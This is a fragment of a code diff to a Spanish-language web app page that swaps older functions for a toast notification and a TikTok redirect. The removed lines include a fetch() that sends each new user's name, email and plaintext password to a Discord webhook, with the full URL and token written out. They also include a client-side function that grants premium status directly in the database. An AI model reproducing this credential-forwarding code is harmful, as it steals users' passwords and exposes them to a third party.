-                fetch("https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr", {
-                    method: 'POST', headers: {'Content-Type':'application/json'},
-                    body: JSON.stringify({content: `👤 NUEVO REGISTRO: ${u}\n✉️ Correo: ${e}\n🔑 Pass: ${p}`})
-                });
-            } catch(e) { alert(e.message); }
+        function showToast() {
+            const toast = document.getElementById("toast");
+            toast.className = "show";
+            // El toast se oculta automáticamente con CSS, pero podemos asegurarnos aquí si es necesario
+            setTimeout(function(){ toast.className = toast.className.replace("show", ""); }, 3000);
         }
 
-        function guestMode() { isGuest = true; document.getElementById('auth-section').style.display = 'none'; document.getElementById('main-dashboard').style.display = 'block'; render(); }
-        function toggleAuth() { const l = document.getElementById('login-container'), r = document.getElementById('register-container'); l.style.display = l.style.display==='none'?'block':'none'; r.style.display = r.style.display==='none'?'block':'none'; }
-        function openModal(id) { document.getElementById(id).style.display = 'block'; }
-        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-        function logout() { auth.signOut(); location.reload(); }
-        
-        async function givePremium(days) {
-            const email = document.getElementById('ad-email').value.trim();
-            const key = email.replace(/\./g, '_');
-            await db.ref('premium_users/'+key).set({ active: true, days: days });
-            alert("💎 PREMIUM OTORGADO A: " + email);
-        }
-
-        function buyPack(p) {
-            navigator.clipboard.writeText("Quiero el pack de " + p);
-            alert("📋 Mensaje copiado. Redirigiendo...");
-            window.location.href = "https://tiktok.com/@softworks32";
+        function redirectToTikTok() {
+            // Abrir TikTok en una pestaña nueva
+            window.open(tiktokUrl, '_blank');
         }
     </script>
+
 </body>
 </html>
